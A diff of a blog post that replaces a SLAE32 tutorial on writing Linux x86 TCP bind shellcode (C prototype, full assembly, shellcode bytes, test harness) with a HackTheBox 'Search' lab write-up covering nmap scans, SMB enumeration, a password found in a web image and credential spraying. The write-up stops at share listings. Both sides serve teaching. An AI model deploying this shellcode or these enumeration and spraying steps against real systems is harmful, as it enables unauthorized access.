@@ -1,666 +1,572 @@
 ---
 layout: single
-title: HackTheBox test
+title: HackTheBox - Search
 date: 2022-5-4
 classes: wide
 header:
-  teaser: /assets/images/slae32.png
+  teaser: /assets/images/images/slae32.png
 categories:
-  - slae
-  - test
+  - HTB
+  - Hard
 tags:
-  - slae
-  - assembly
-  - tcp bind shellcode
+  - Information Leakage
+  - RPC enumeration
+  - Password in photo?(realistic)
+  - Ldap enumeration
+  - BloodHound enumeration kerberoasting attack
+  - Using pfx certifications
+  - Web Powershell
+  - Abusing ReadGMSAPassword
 ---
-A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell.
+I start with nmap scanning open ports in the machine, take all open ports and then making a more exaustive scan.
 
-The shellcode does the following:
-1. Creates a socket
-2. Binds the socket to an IP address and port
-3. Listens for incoming connections
-4. Redirects STDIN, STDOUT and STDERR to the socket once a connection is made
-5. Executes a shell
-
-### C prototype
----------------
-To better understand the process of creating a bind shellcode, I created a prototype in C that uses the same functions that'll be used in the assembly version. The full code is shown here. We'll walk through each section of the code after.
-
-```c
-#include <netinet/in.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/socket.h>
-#include <unistd.h>
-
-int main()
-{
-    // Create addr struct
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(4444); // Port
-    addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on any interface
-
-    // Create socket
-    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == -1) {
-        perror("Socket creation failed.\n");
-        exit(EXIT_FAILURE);
-    }
-
-    // Bind socket
-    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
-        perror("Socket bind failed.\n");
-        close(sock);
-        exit(EXIT_FAILURE);
-    }
-
-    // Listen for connection
-    if (listen(sock, 0) == -1) {
-        perror("Listen failed.\n");
-        close(sock);
-        exit(EXIT_FAILURE);
-    }
-
-    // Accept connection
-    int fd = accept(sock, NULL, NULL);
-    if (fd == -1) {
-        perror("Socket accept failed.\n");
-        close(sock);
-        exit(EXIT_FAILURE);
-    }
-
-    // Duplicate stdin/stdout/stderr to socket
-    dup2(fd, 0); // stdin
-    dup2(fd, 1); // stdout
-    dup2(fd, 2); // stderr
-
-    // Execute shell
-    execve("/bin/sh", NULL, NULL);
-}
-```
-
-#### 1. Socket creation
-```c
-// Create socket
-int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-if (sock == -1) {
-    perror("Socket creation failed.\n");
-    exit(EXIT_FAILURE);
-}
-```
-
-The `socket` function requires 3 arguments:
-- int `domain`: The domain is `AF_INET` here since we are going to use IPv4 instead of local sockets or IPv6.
-- int `type`: For TCP sockets we use `SOCK_STREAM`. If we wanted to use UDP we'd use `SOCK_DGRAM` instead.
-- int `protocol`: For `SOCK_STREAM`, there's a single protocol implemented, we could use 0 also here.
-
-#### 2. Binding the socket
-```c
-// Create addr struct
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(4444); // Port
-    addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on any interface
-
-[...]
-
-// Bind socket
-if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
-    perror("Socket bind failed.\n");
-    close(sock);
-    exit(EXIT_FAILURE);
-}
-```
-A socket by itself doesn't do anything since we haven't associated the socket with any port or IP address. The `bind` function assigns the IP and port to the socket previously created. The man pages for `ip` explain the different parameters:
-
-```c
-struct sockaddr_in {
-   sa_family_t    sin_family; /* address family: AF_INET */
-   in_port_t      sin_port;   /* port in network byte order */
-   struct in_addr sin_addr;   /* internet address */
-};
-
-/* Internet address. */
-struct in_addr {
-   uint32_t       s_addr;     /* address in network byte order */
-};
-```
-
-In data networking, packets are transmitted in big-endian order (aka network byte order), so we use the `htons` and `htonl` function to convert the port and address to the right endianness. The `INADDR_ANY` is just a reference to NULL, so the program will bind to all interfaces on the machine. If we wanted to listen on a specific interface we would use the IP address of the interface here.
-
-#### 3. Listen and Accept connections
-
-```c
-// Listen for connection
-if (listen(sock, 0) == -1) {
-    perror("Listen failed.\n");
-    close(sock);
-    exit(EXIT_FAILURE);
-}
-
-// Accept connection
-int fd = accept(sock, NULL, NULL);
-if (fd == -1) {
-    perror("Socket accept failed.\n");
-    close(sock);
-    exit(EXIT_FAILURE);
-}
-```
-
-The `listen` function tells the socket to listen for new connections. We can set the backlog to 0 since we only need to process a single connection request.
-
-The `accept` function requires 3 arguments:
-- int `sockfd`:  This is the value of the socket descriptor we created earlier
-- struct `sockaddr *addr`: We can set this to NULL because we don't need to store the IP address of the connection host
-- socklen_t `*addrlen`: Set to NULL because we're not using `addr`
-
-The program now waits for incoming connection as this point. As indicated in the man page:
-
-> If no pending connections are present on the queue, and the socket is not marked as nonblocking, accept() blocks the caller until a connection is present.
-
-When the connection is received, the `accept` function will return the descriptor of the connection which we'll use to redirected IO to.
-
-#### 4. Duplicate file descriptors
-
-```c
-    // Duplicate stdin/stdout/stderr to socket
-    dup2(fd, 0); //stdin
-    dup2(fd, 1); //stdout
-    dup2(fd, 2); //stderr
-```
-
-Before the shell is executed, the file descriptors for stdin, stdout and stderr are duplicated to the descriptor of the TCP connection. This is necessary to redirect input and output from the executed process to the network socket.
-
-#### 5. Execute shell
-
-```c
-// Execute shell
-execve("/bin/sh", NULL, NULL);
-```
-
-`execve`  does not start a new process but instead replaces the current program with a new one. Here the `/bin/sh` shell binary is used without any arguments passed to it. If we wanted to use another binary with command line arguments or environment variables, we'd pass those using the 2nd and 3rd arguments.
-
-#### Testing the program
-
-The code is compiled as follows:
-```
-slemire@slae:~/slae32/assignment1$ gcc -o shell_bind_tcp_c shell_bind_tcp.c
-shell_bind_tcp.c: In function ‘main’:
-shell_bind_tcp.c:50:2: warning: null argument where non-null required (argument 2) [-Wnonnull]
-  execve("/bin/sh", NULL, NULL);
-  ^
-```
-
-The compiler gives a warning because we're using a NULL value instead of pointing to an array of strings but the code still works.
-
-Now it's time to test it, :
-```
-[In the first terminal session]
-slemire@slae:~/slae32/assignment1$ ./shell_bind_tcp
-...
-[Using another terminal session]
-slemire@slae:~$ nc -nv 127.0.0.1 4444
-Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
-id
-uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
-```
-
-`ltrace` can be used to record dynamic library calls made during the execution of the program. We can see both file descriptors created: `fd 4` is the one created when the connection is accepted, and is the one used to redirect the input & output to.
 ```console
-slemire@supersnake:~/slae32/assignment1$ ltrace ./shell_bind_tcp_c
-__libc_start_main(0x804864b, 1, 0xbffff6b4, 0x80487f0 <unfinished ...>
-htons(4444, 0xb7fcc000, 0xb7fca244, 0xb7e320ec)                                                                        = 0x5c11
-htonl(0, 0xb7fcc000, 0xb7fca244, 0xb7e320ec)                                                                           = 0
-socket(2, 1, 6)                                                                                                        = 3
-bind(3, 0xbffff5ec, 16, 0xb7e320ec)                                                                                    = 0
-listen(3, 0, 16, 0xb7e320ec)                                                                                           = 0
-accept(3, 0, 0, 0xb7e320ec)                                                                                            = 4
-dup2(4, 0)                                                                                                             = 0
-dup2(4, 1)                                                                                                             = 1
-dup2(4, 2)                                                                                                             = 2
-execve(0x80488c5, 0, 0, 0xb7e320ec <no return ...>
---- Called exec() ---
+nmap --open -p- -sS --min-rate 4000 -vvv -n -Pn -oG allPorts 10.10.11.129
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 10:03 UTC
+Initiating SYN Stealth Scan at 10:03
+Scanning 10.10.11.129 [65535 ports]
+Discovered open port 135/tcp on 10.10.11.129
+Discovered open port 443/tcp on 10.10.11.129
+Discovered open port 139/tcp on 10.10.11.129
+Discovered open port 80/tcp on 10.10.11.129
+Discovered open port 53/tcp on 10.10.11.129
+Discovered open port 445/tcp on 10.10.11.129
+Discovered open port 53433/tcp on 10.10.11.129
+Discovered open port 49669/tcp on 10.10.11.129
+Discovered open port 389/tcp on 10.10.11.129
+Discovered open port 9389/tcp on 10.10.11.129
+Discovered open port 3268/tcp on 10.10.11.129
+Discovered open port 49691/tcp on 10.10.11.129
+Discovered open port 49670/tcp on 10.10.11.129
+Discovered open port 3269/tcp on 10.10.11.129
+Discovered open port 49702/tcp on 10.10.11.129
+Discovered open port 49667/tcp on 10.10.11.129
+Discovered open port 593/tcp on 10.10.11.129
+Discovered open port 464/tcp on 10.10.11.129
+Discovered open port 88/tcp on 10.10.11.129
+Discovered open port 636/tcp on 10.10.11.129
+Discovered open port 8172/tcp on 10.10.11.129
+Discovered open port 49727/tcp on 10.10.11.129
 ```
-
-### Assembly version
---------------------
-The assembly version follows the same logic flow previously used in the C protoype. First, registers are cleared to make sure there are no unintended side effects when testing the shellcode within the `shellcode.c` skeleton program. Initially, when I tested the code and didn't clear out all registers, the ELF binary created by NASM worked ok but the shellcode inside the skeleton program crashed because EAX already had a value in the upper half of the register.
-
-```nasm
-; Zero registers
-xor eax, eax
-xor ebx, ebx
-xor ecx, ecx
-xor edx, edx
-```
-
-For this shellcode version, I used the initial syscall used in earlier Linux versions where a single syscall was used to control all socket functions on the kernel. Newer Linux versions implement separate syscalls as indicated in the `socketcall` man page:
-
->On a some architectures—for example, x86-64 and ARM—there is no
-socketcall() system call; instead socket(2), accept(2), bind(2), and
-so on really are implemented as separate system calls.
->
->On x86-32, socketcall() was historically the only entry point for the
-sockets API.  However, starting in Linux 4.3, direct system calls are
-provided on x86-32 for the sockets API.
-
-```int socketcall(int call, unsigned long *args);```
-
-`sys_socketcall` works a bit differently than other syscalls. The first argument (EBX register) contains the function name being called and the 2nd argument in ECX contains a pointer to a memory address containing the various arguments for the function.
-
-`/usr/include/linux/net.h` contains the following list of function calls:
-
-```c
-#define SYS_SOCKET  1       /* sys_socket(2)        */
-#define SYS_BIND    2       /* sys_bind(2)          */
-#define SYS_CONNECT 3       /* sys_connect(2)       */
-#define SYS_LISTEN  4       /* sys_listen(2)        */
-#define SYS_ACCEPT  5       /* sys_accept(2)        */
-...
-```
-
-Let's take the socket creation as an example:
-
-```nasm
-; Create socket
-mov al, 0x66        ; sys_socketcall
-mov bl, 0x1         ;   SYS_SOCKET
-push 0x6            ; int protocol -> IPPROTO_TCP
-push 0x1            ; int type -> SOCK_STREAM
-push 0x2            ; int domain -> AF_INET
-mov ecx, esp
-int 0x80            ; sys_socketcall (SYS_SOCKET)
-mov edi, eax        ; save socket fd
-```
-
-`EAX` contains `0x66` which is `sys_socketcall`, then EBX is set to `0x1` (SYS_SOCKET). Next the arguments for `socket()` itself are pushed on the stack then the value of the stack frame pointer is moved into `ECX`. When the function call returns, the descriptor value is saved into `EDI` so it can be used later.
-
-The sockaddr_in struct is created as follows:
-
-```nasm
-; Create addr struct
-push edx            ; NULL padding
-push edx            ; NULL padding
-push edx            ; sin.addr (0.0.0.0)
-push word 0x5c11    ; Port
-push word 0x2       ; AF_INET
-mov esi, esp
-```
-
-Since the addr struct needs to be 16 bytes, `$edx` is pushed twice to add 8 bytes of null padding. `$edx` is pushed a third time to define the listening address for the socket and finally the port number is pushed followed by the domain value for `AF_INET`.
-
-For `bind`, we push the size of the addr struct (16 bytes), then its address which we saved to the `$esi` register earlier and the socket description from `$edi`.
-
-```nasm
-; Bind socket
-mov al, 0x66        ; sys_socketcall
-mov bl, 0x2         ;   SYS_BIND
-push 0x10           ; socklen_t addrlen
-push esi            ; const struct sockaddr *addr
-push edi            ; int sockfd -> saved socket fd
-mov ecx, esp
-int 0x80            ; sys_socketcall (SYS_BIND)
-```
-
-The `listen` and `accept` functions work the same way with the arguments being pushed on the stack and using `sys_socketcall`.
-
-```nasm
-; Listen for connection
-mov al, 0x66        ; sys_socketcall
-mov bl, 0x4         ;   SYS_LISTEN
-push edx            ; int backlog -> NULL
-push edi            ; int sockfd -> saved socket fd
-mov ecx, esp
-int 0x80            ; sys_socketcall (SYS_LISTEN)
-
-; Accept connection
-mov al, 0x66        ; sys_socketcall
-mov bl, 0x5         ;   SYS_ACCEPT
-push edx            ; socklen_t *addrlen -> NULL
-push edx            ; struct sockaddr *addr -> NULL
-push edi            ; int sockfd -> saved sock fd value
-mov ecx, esp
-int 0x80            ; sys_socketcall (SYS_ACCEPT)
-```
-
-To redirect IO to the descriptor, a loop with the `$ecx` register is used. Because of the way the loop instruction works (it exits when `$ecx` is 0), the `dec` and `inc` instruction are used here so we can still use the `$ecx` value to call `dup2`.
-
-```nasm
-; Redirect STDIN, STDOUT, STDERR to socket
-xor ecx, ecx
-mov cl, 0x3         ; counter for loop (stdin to stderr)
-mov ebx, edi        ; socket fd
-
-dup2:
-mov al, 0x3f        ; sys_dup2
-dec ecx
-int 0x80            ; sys_dup2
-inc ecx
-loop dup2
-```
-
-The `/bin/bash` program is used to spawn a shell, padding it with forward slashes so it is 4 bytes aligned. Because the string needs to be null-terminated, an garbage character (`A`) is added to string and is changed to a NULL with the subsequent `mov byte [esp + 11], al` instruction.
-
-```nasm
-; execve()
-xor eax, eax
-push 0x41687361     ; ///bin/bashA
-push 0x622f6e69
-push 0x622f2f2f
-mov byte [esp + 11], al ; NULL terminate string
-mov al, 0xb         ; sys_execve
-mov ebx, esp        ; const char *filename
-xor ecx, ecx        ; char *const argv[]
-xor edx, edx        ; char *const envp[]
-int 0x80            ; sys_execve
-```
-
-The final assembly code looks like this:
-
-```nasm
-global _start
-
-section .text
-
-_start:
-
-    ; Zero registers
-    xor eax, eax
-    xor ebx, ebx
-    xor ecx, ecx
-    xor edx, edx
-
-    ; Create socket
-    mov al, 0x66        ; sys_socketcall
-    mov bl, 0x1         ;   SYS_SOCKET
-    push 0x6            ; int protocol -> IPPROTO_TCP
-    push 0x1            ; int type -> SOCK_STREAM
-    push 0x2            ; int domain -> AF_INET
-    mov ecx, esp
-    int 0x80            ; sys_socketcall (SYS_SOCKET)
-    mov edi, eax        ; save socket fd
-
-    ; Create addr struct
-    push edx            ; NULL padding
-    push edx            ; NULL padding
-    push edx            ; sin.addr (0.0.0.0)
-    push word 0x5c11    ; Port
-    push word 0x2       ; AF_INET
-    mov esi, esp
-
-    ; Bind socket
-    mov al, 0x66        ; sys_socketcall
-    mov bl, 0x2         ;   SYS_BIND
-    push 0x10           ; socklen_t addrlen
-    push esi            ; const struct sockaddr *addr
-    push edi            ; int sockfd -> saved socket fd
-    mov ecx, esp
-    int 0x80            ; sys_socketcall (SYS_BIND)
-
-    ; Listen for connection
-    mov al, 0x66        ; sys_socketcall
-    mov bl, 0x4         ;   SYS_LISTEN
-    push edx            ; int backlog -> NULL
-    push edi            ; int sockfd -> saved socket fd
-    mov ecx, esp
-    int 0x80            ; sys_socketcall (SYS_LISTEN)
-
-    ; Accept connection
-    mov al, 0x66        ; sys_socketcall
-    mov bl, 0x5         ;   SYS_ACCEPT
-    push edx            ; socklen_t *addrlen -> NULL
-    push edx            ; struct sockaddr *addr -> NULL
-    push edi            ; int sockfd -> saved sock fd value
-    mov ecx, esp
-    int 0x80            ; sys_socketcall (SYS_ACCEPT)
-    mov edi, eax
-
-    ; Redirect STDIN, STDOUT, STDERR to socket
-    xor ecx, ecx
-    mov cl, 0x3         ; counter for loop (stdin to stderr)
-    mov ebx, edi        ; socket fd
-
-    dup2:
-    mov al, 0x3f        ; sys_dup2
-    dec ecx
-    int 0x80            ; sys_dup2
-    inc ecx
-    loop dup2
-
-    ; execve()
-    xor eax, eax
-    push 0x41687361     ; ///bin/bashA
-    push 0x622f6e69
-    push 0x622f2f2f
-    mov byte [esp + 11], al ; NULL terminate string
-    mov al, 0xb         ; sys_execve
-    mov ebx, esp        ; const char *filename
-    xor ecx, ecx        ; char *const argv[]
-    xor edx, edx        ; char *const envp[]
-    int 0x80            ; sys_execve
-```
-
-Compiling and linking the code...
+now lets scan more deeply these ports we found to use some basic scripts and see the version they using.
 ```console
-slemire@slae:~/slae32/assignment1$ ../compile.sh shell_bind_tcp
-[+] Assembling with Nasm ... 
-[+] Linking ...
-[+] Shellcode: \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
-[+] Length: 116
-[+] Done!
-```
+which extractPorts | bat -l bash
+extractPorts () {
+   2   │     ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
+   3   │     ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
+   4   │     echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
+   5   │     echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
+   6   │     echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
+   7   │     echo $ports | tr -d '\n' | xclip -sel clip
+   8   │     echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
+   9   │     bat extractPorts.tmp
+  10   │     rm extractPorts.tmp
+  11   │ }
 
-Testing the ELF binary generated by NASM:
+```
+I have these utility that extract all the importan information and copy the ports to the clipboard.
+So now with all the ports copied we do the scan.
+```colsone
+nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,49666,49669,49670,49692,49703,49727 -oN targeted 10.10.11.129
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-07 10:08 UTC
+Nmap scan report for search.htb (10.10.11.129)
+Host is up (0.044s latency).
+
+PORT      STATE    SERVICE       VERSION
+53/tcp    open     domain        Simple DNS Plus
+80/tcp    open     http          Microsoft IIS httpd 10.0
+|_http-title: Search &mdash; Just Testing IIS
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-07 10:27:54Z)
+135/tcp   open     msrpc         Microsoft Windows RPC
+139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+443/tcp   open     ssl/http      Microsoft IIS httpd 10.0
+|_http-title: Search &mdash; Just Testing IIS
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+445/tcp   open     microsoft-ds?
+464/tcp   open     kpasswd5?
+593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
+8172/tcp  open     ssl/http      Microsoft IIS httpd 10.0
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: 2022-05-07T10:29:24+00:00; +19m18s from scanner time.
+|_http-title: Site doesn't have a title.
+|_http-server-header: Microsoft-IIS/10.0
+| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
+| Not valid before: 2020-04-07T09:05:25
+|_Not valid after:  2030-04-05T09:05:25
+9389/tcp  open     mc-nmf        .NET Message Framing
+49666/tcp filtered unknown
+49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49670/tcp open     msrpc         Microsoft Windows RPC
+49692/tcp filtered unknown
+49703/tcp filtered unknown
+49727/tcp open     msrpc         Microsoft Windows RPC
+Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-05-07T10:28:45
+|_  start_date: N/A
+|_clock-skew: mean: 19m17s, deviation: 0s, median: 19m17s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+```
+We see a lot of ports so we start with basic recognizement
 ```console
-slemire@slae:~/slae32/assignment1$ file shell_bind_tcp
-shell_bind_tcp: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
-[...]
-slemire@slae:~/slae32/assignment1$ ./shell_bind_tcp
-[...]
-slemire@slae:~$ nc -nv 127.0.0.1 4444
-Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
-id
-uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+   /home/h/De/h4rticx/HTB/search/nmap    smbmap -u "" -H 10.10.11.129 --no-banner
+                                                                                                    
+[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
+[!] Something weird happened: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied}
+
+   ~/De/h4rticx/HTB/search/nmap  took  4s  crackmapexec smb 10.10.11.129
+
+SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
+   ~/Desktop/h4rticx/HTB/search/nmap  rpcclient -U "" 10.10.11.129 -N -c 'enumdomusers'
+result was NT_STATUS_ACCESS_DENIED
 ```
-
-The `shellcode.c` program is then used to test the shellcode as it would used in an actual exploit:
-```c
-#include <stdio.h>
-
-char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x89\xfb\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc0\x68\x61\x73\x68\x41\x68\x69\x6e\x2f\x62\x68\x2f\x2f\x2f\x62\x88\x44\x24\x0b\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
-
-int main()
-{
-    int (*ret)() = (int(*)())shellcode;
-    printf("Size: %d bytes.\n", sizeof(shellcode));
-    ret();
-}
+We cant connect to smb with null session but see domain name search.htb so we add it in /etc/hosts, check rdp with null session but access denied, so we go check the web.
+Analycing the web i notice a weird image, so i check it up in a new tab with more zoom.
+![image found](/assets/images/weird.png)
+Found Hope sharp and password "IsolationIsKey?" so because i dont know the user i make a list with posible users.
+![image user](/assets/images/hopesharpuser.png)
+And the try with crackmapexec who is the good one.
+```console
+    ~/Desktop/h4rticx/HTB/search/content  crackmapexec smb 10.10.11.129 -u users.txt -p "IsolationIsKey?"
+ SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hopesharp:IsolationIsKey? STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\h.sharp:IsolationIsKey? STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.s:IsolationIsKey? STATUS_LOGON_FAILURE 
+SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
 ```
-
-The test program is compiled and tested:
-
+hope.sharp is the correct user so we try get more info with rpd and sbm now we have credentials.
+```console
+❯ smbmap -u 'hope.sharp' -p 'IsolationIsKey?' -H 10.10.11.129 -r 'RedirectedFolders$' --no-banner
+                                                                                                    
+[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	RedirectedFolders$                                	READ, WRITE	
+	.\RedirectedFolders$\\*
+	dr--r--r--                0 Sat May  7 10:58:10 2022	.
+	dr--r--r--                0 Sat May  7 10:58:10 2022	..
+	dr--r--r--                0 Tue Apr  7 18:12:58 2020	abril.suarez
+	dr--r--r--                0 Fri Jul 31 13:11:32 2020	Angie.Duffy
+	dr--r--r--                0 Fri Jul 31 12:35:32 2020	Antony.Russo
+	dr--r--r--                0 Tue Apr  7 18:32:31 2020	belen.compton
+	dr--r--r--                0 Fri Jul 31 12:37:36 2020	Cameron.Melendez
+	dr--r--r--                0 Tue Apr  7 18:15:09 2020	chanel.bell
+	dr--r--r--                0 Fri Jul 31 13:09:07 2020	Claudia.Pugh
+	dr--r--r--                0 Fri Jul 31 12:02:04 2020	Cortez.Hickman
+	dr--r--r--                0 Tue Apr  7 18:20:08 2020	dax.santiago
+	dr--r--r--                0 Fri Jul 31 11:55:34 2020	Eddie.Stevens
+	dr--r--r--                0 Thu Apr  9 20:04:11 2020	edgar.jacobs
+	dr--r--r--                0 Fri Jul 31 12:39:50 2020	Edith.Walls
+	dr--r--r--                0 Tue Apr  7 18:23:13 2020	eve.galvan
+	dr--r--r--                0 Tue Apr  7 18:29:22 2020	frederick.cuevas
+	dr--r--r--                0 Thu Apr  9 14:34:41 2020	hope.sharp
+	dr--r--r--                0 Tue Apr  7 18:07:00 2020	jayla.roberts
+	dr--r--r--                0 Fri Jul 31 13:01:06 2020	Jordan.Gregory
+	dr--r--r--                0 Thu Apr  9 20:11:39 2020	payton.harmon
+	dr--r--r--                0 Fri Jul 31 11:44:32 2020	Reginald.Morton
+	dr--r--r--                0 Tue Apr  7 18:10:25 2020	santino.benjamin
+	dr--r--r--                0 Fri Jul 31 12:21:42 2020	Savanah.Velazquez
+	dr--r--r--                0 Thu Nov 18 01:01:45 2021	sierra.frye
+	dr--r--r--                0 Thu Apr  9 20:14:26 2020	trace.ryan
+❯ smbmap -u 'hope.sharp' -p 'IsolationIsKey?' -H 10.10.11.129 -r 'RedirectedFolders$/hope.sharp' --no-banner
+                                                                                                    
+[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	RedirectedFolders$                                	READ, WRITE	
+	.\RedirectedFolders$\hope.sharp\*
+	dr--r--r--                0 Thu Apr  9 14:34:41 2020	.
+	dr--r--r--                0 Thu Apr  9 14:34:41 2020	..
+	dw--w--w--                0 Thu Apr  9 14:35:49 2020	Desktop
+	dw--w--w--                0 Thu Apr  9 14:35:50 2020	Documents
+	dw--w--w--                0 Thu Apr  9 14:35:49 2020	Downloads
+❯ smbmap -u 'hope.sharp' -p 'IsolationIsKey?' -H 10.10.11.129 -r 'RedirectedFolders$/hope.sharp/Desktop' --no-banner
+                                                                                                    
+[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	RedirectedFolders$                                	READ, WRITE	
+	.\RedirectedFolders$\hope.sharp\Desktop\*
+	dw--w--w--                0 Thu Apr  9 14:35:49 2020	.
+	dw--w--w--                0 Thu Apr  9 14:35:49 2020	..
+	dr--r--r--                0 Thu Apr  9 14:35:49 2020	$RECYCLE.BIN
+	fr--r--r--              282 Thu Apr  9 14:35:00 2020	desktop.ini
+	fr--r--r--             1450 Thu Apr  9 14:35:38 2020	Microsoft Edge.lnk
+❯ smbmap -u 'hope.sharp' -p 'IsolationIsKey?' -H 10.10.11.129 -r 'RedirectedFolders$/hope.sharp/Downloads' --no-banner
+                                                                                                    
+[+] IP: 10.10.11.129:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	RedirectedFolders$                                	READ, WRITE	
+	.\RedirectedFolders$\hope.sharp\Downloads\*
+	dw--w--w--                0 Thu Apr  9 14:35:49 2020	.
+	dw--w--w--                0 Thu Apr  9 14:35:49 2020	..
+	dr--r--r--                0 Thu Apr  9 14:35:49 2020	$RECYCLE.BIN
+	fr--r--r--              282 Thu Apr  9 14:35:02 2020	desktop.ini 
 ```
